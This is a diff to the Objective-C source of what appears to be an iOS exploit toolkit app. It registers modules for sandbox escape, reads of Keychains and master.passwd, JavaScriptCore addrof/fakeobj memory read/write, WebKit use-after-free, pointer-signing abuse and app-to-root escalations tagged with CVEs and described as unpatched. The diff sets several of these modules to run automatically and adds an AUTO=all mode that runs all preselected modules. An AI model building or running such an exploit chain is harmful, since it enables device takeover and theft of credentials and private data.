@@ -282,7 +282,7 @@ static void refreshRootPill(void) {
 
     [self.modules addObject:@{@"name":@"worse_query container escape", @"desc":@"PUBLIC, unpatched on 26.0-26.7.2: read/write every app container", @"status":@"PUBLIC", @"block":[^{ return RunRootPath(@"worse_query container escape") ?: RunModule(@"worse_query container escape"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"bl_sbx: itunesstored", @"desc":@"PUBLIC: arbitrary write as uid 501, MobileGestalt cache", @"status":@"PUBLIC", @"block":[^{ return RunRootPath(@"bl_sbx: itunesstored") ?: RunModule(@"bl_sbx: itunesstored"); } copy], @"auto":@(NO)}];
-    [self.modules addObject:@{@"name":@"Sandbox: bad_query escape", @"desc":@"PROVEN: READ grants on /System and /usr/lib", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Sandbox: bad_query escape") ?: RunModule(@"Sandbox: bad_query escape"); } copy], @"auto":@(NO)}];
+    [self.modules addObject:@{@"name":@"Sandbox: bad_query escape", @"desc":@"PROVEN: READ grants on /System and /usr/lib", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Sandbox: bad_query escape") ?: RunModule(@"Sandbox: bad_query escape"); } copy], @"auto":@(YES)}];
     [self.modules addObject:@{@"name":@"Root-owned file read", @"desc":@"PROVEN: SystemVersion, Keychains, master.passwd", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Root-owned file read") ?: RunModule(@"Root-owned file read"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"task_for_pid root sweep", @"desc":@"task port of a root pid -> its memory, its code, its identity", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"task_for_pid root sweep") ?: RunModule(@"task_for_pid root sweep"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"mach_vm R/W primitives", @"desc":@"the read/write step a task port unlocks", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"mach_vm R/W primitives") ?: RunModule(@"mach_vm R/W primitives"); } copy], @"auto":@(NO)}];
@@ -291,7 +291,7 @@ static void refreshRootPill(void) {
     [self.modules addObject:@{@"name":@"daemon surface: Mach services", @"desc":@"privileged daemons answering from the container", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"daemon surface: Mach services") ?: RunModule(@"daemon surface: Mach services"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"daemon pivot: writable paths", @"desc":@"paths a root daemon reads that we can write", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"daemon pivot: writable paths") ?: RunModule(@"daemon pivot: writable paths"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"daemon pivot: container write", @"desc":@"our writes landing in other containers", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"daemon pivot: container write") ?: RunModule(@"daemon pivot: container write"); } copy], @"auto":@(NO)}];
-    [self.modules addObject:@{@"name":@"JSC scribble R/W", @"desc":@"DarkSword method: addrof/fakeobj -> read64/write64, NO PAC forgery", @"status":@"JSC", @"block":[^{ return RunRootPath(@"JSC scribble R/W") ?: RunModule(@"JSC scribble R/W"); } copy], @"auto":@(NO)}];
+    [self.modules addObject:@{@"name":@"JSC scribble R/W", @"desc":@"DarkSword method: addrof/fakeobj -> read64/write64, NO PAC forgery", @"status":@"JSC", @"block":[^{ return RunRootPath(@"JSC scribble R/W") ?: RunModule(@"JSC scribble R/W"); } copy], @"auto":@(YES)}];
     [self.modules addObject:@{@"name":@"WebKit DFG UAF", @"desc":@"PROVEN: addrof + fakeobj (CVE-2025-43529)", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"WebKit DFG UAF") ?: RunModule(@"WebKit DFG UAF"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"JSC structure-ID scan", @"desc":@"the missing piece: in-object R/W without PAC", @"status":@"JSC", @"block":[^{ return RunRootPath(@"JSC structure-ID scan") ?: RunModule(@"JSC structure-ID scan"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"JSC fake-object R/W", @"desc":@"arbitrary read/write through a real structure ID", @"status":@"JSC", @"block":[^{ return RunRootPath(@"JSC fake-object R/W") ?: RunModule(@"JSC fake-object R/W"); } copy], @"auto":@(NO)}];
@@ -300,19 +300,19 @@ static void refreshRootPill(void) {
     [self.modules addObject:@{@"name":@"IOHID float->int sites", @"desc":@"73 conversion sites - user client gated today", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"IOHID float->int sites") ?: RunModule(@"IOHID float->int sites"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"IOSurface format-class", @"desc":@"format consistency, locked=7 / mismatch=0", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"IOSurface format-class") ?: RunModule(@"IOSurface format-class"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"AVE2 user client", @"desc":@"IOServiceOpen 0xe00002e2 - gated by the sandbox", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"AVE2 user client") ?: RunModule(@"AVE2 user client"); } copy], @"auto":@(NO)}];
-    [self.modules addObject:@{@"name":@"kernel selector sweep", @"desc":@"selectors on the OPEN JPEG/M2Scaler/KeyStore user clients", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"kernel selector sweep"); } copy], @"auto":@(NO)}];
-    [self.modules addObject:@{@"name":@"app group diagnostics", @"desc":@"why the group container is nil, and our real pivot base", @"status":@"PIVOT", @"block":[^{ return RunKernelPath(@"app group diagnostics"); } copy], @"auto":@(NO)}];
+    [self.modules addObject:@{@"name":@"kernel selector sweep", @"desc":@"selectors on the OPEN JPEG/M2Scaler/KeyStore user clients", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"kernel selector sweep"); } copy], @"auto":@(YES)}];
+    [self.modules addObject:@{@"name":@"app group diagnostics", @"desc":@"why the group container is nil, and our real pivot base", @"status":@"PIVOT", @"block":[^{ return RunKernelPath(@"app group diagnostics"); } copy], @"auto":@(YES)}];
     [self.modules addObject:@{@"name":@"IOSurfaceRoot selectors", @"desc":@"externalMethod sweep on a reachable root client", @"status":@"KERNEL", @"block":[^{ return RunRootPath(@"IOSurfaceRoot selectors") ?: RunModule(@"IOSurfaceRoot selectors"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"GPU / WebGL", @"desc":@"WebKit WebGL, PBO validation correct (ANGLE absent)", @"status":@"GPU", @"block":[^{ return RunRootPath(@"GPU / WebGL") ?: RunModule(@"GPU / WebGL"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"IOSkywalk varint (LAN)", @"desc":@"off-by-one in the parser - needs a LAN frame", @"status":@"LAN", @"block":[^{ return RunRootPath(@"IOSkywalk varint (LAN)") ?: RunModule(@"IOSkywalk varint (LAN)"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"XNU ND6 options (LAN)", @"desc":@"4 missing checks - needs a LAN frame", @"status":@"LAN", @"block":[^{ return RunRootPath(@"XNU ND6 options (LAN)") ?: RunModule(@"XNU ND6 options (LAN)"); } copy], @"auto":@(NO)}];
-    [self.modules addObject:@{@"name":@"CoreServices path handling", @"desc":@"CVE-2026-20615: app -> root, unpatched on 26.2b1", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CoreServices path handling") ?: RunModule(@"CoreServices path handling"); } copy], @"auto":@(NO)}];
-    [self.modules addObject:@{@"name":@"CoreServices race", @"desc":@"CVE-2026-20617: app -> root, unpatched on 26.2b1", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CoreServices race") ?: RunModule(@"CoreServices race"); } copy], @"auto":@(NO)}];
+    [self.modules addObject:@{@"name":@"CoreServices path handling", @"desc":@"CVE-2026-20615: app -> root, unpatched on 26.2b1", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CoreServices path handling") ?: RunModule(@"CoreServices path handling"); } copy], @"auto":@(YES)}];
+    [self.modules addObject:@{@"name":@"CoreServices race", @"desc":@"CVE-2026-20617: app -> root, unpatched on 26.2b1", @"status":@"ROOT2K", @"block":[^{ return RunRootPath(@"CoreServices race") ?: RunModule(@"CoreServices race"); } copy], @"auto":@(YES)}];
     [self.modules addObject:@{@"name":@"libxpc sandbox break", @"desc":@"CVE-2026-20667: app -> sandbox escape, unpatched on 26.2b1", @"status":@"SBX2K", @"block":[^{ return RunRootPath(@"libxpc sandbox break") ?: RunModule(@"libxpc sandbox break"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"cfprefsd confused deputy", @"desc":@"root daemon reachable from the container (CVE-2019-7286 class)", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"cfprefsd confused deputy") ?: RunModule(@"cfprefsd confused deputy"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"MobileGestalt cache poison", @"desc":@"SystemGroup write -> plist read process-wide", @"status":@"PIVOT", @"block":[^{ return RunRootPath(@"MobileGestalt cache poison") ?: RunModule(@"MobileGestalt cache poison"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"writetosymlinked", @"desc":@"PUBLIC: write anywhere under /var/mobile/Containers (fixed 26.2b2)", @"status":@"PUBLIC", @"block":[^{ return RunRootPath(@"writetosymlinked") ?: RunModule(@"writetosymlinked"); } copy], @"auto":@(NO)}];
-    [self.modules addObject:@{@"name":@"Unified: JSC R/W + dyld oracle", @"desc":@"both primitives in ONE process (JSContext + dlopen) -> NativeExecutable->m_function", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Unified: JSC R/W + dyld oracle"); } copy], @"auto":@(NO)}];
+    [self.modules addObject:@{@"name":@"Unified: JSC R/W + dyld oracle", @"desc":@"both primitives in ONE process (JSContext + dlopen) -> NativeExecutable->m_function", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"Unified: JSC R/W + dyld oracle"); } copy], @"auto":@(YES)}];
     [self.modules addObject:@{@"name":@"dyld PAC oracle -> signPointer", @"desc":@"CVE-2026-20700: signPointer/context control -> signed gadgets", @"status":@"PROVEN", @"block":[^{ return RunRootPath(@"dyld PAC oracle") ?: RunModule(@"dyld PAC oracle"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"AppleJPEGDriver selectors", @"desc":@"CVE-2026-20687: user client OPEN = surface present (no fire)", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"AppleJPEGDriver") ?: RunModule(@"AppleJPEGDriver"); } copy], @"auto":@(NO)}];
     [self.modules addObject:@{@"name":@"AppleM2ScalerCSCDriver", @"desc":@"CVE-2026-43655: fixed-offset write +0x1fe4, no fire", @"status":@"KERNEL", @"block":[^{ return RunKernelPath(@"AppleM2ScalerCSCDriver") ?: RunModule(@"AppleM2ScalerCSCDriver"); } copy], @"auto":@(NO)}];
@@ -338,6 +338,16 @@ static void refreshRootPill(void) {
         NSString *want = [NSString stringWithUTF8String:autoEnv];
         AveLog([NSString stringWithFormat:@"[*] AUTO mode: %@", want]);
         AvePost([NSString stringWithFormat:@"AUTO %@", want]);
+        if ([want isEqualToString:@"all"]) {
+            if (self.selected.count) {
+                [self.table reloadData];
+                [self updateRunTitle];
+                [self run];
+            } else {
+                AveLog(@"[!] AUTO=all: nothing preselected");
+            }
+            return YES;
+        }
         if ([want isEqualToString:@"ROOT"]) {
             BOOL have = RootProbe();
             AveLog(have ? @"[***] ROOT IS PRESENT: uid=0 confirmed" : @"[-] no root: uid!=0 everywhere");
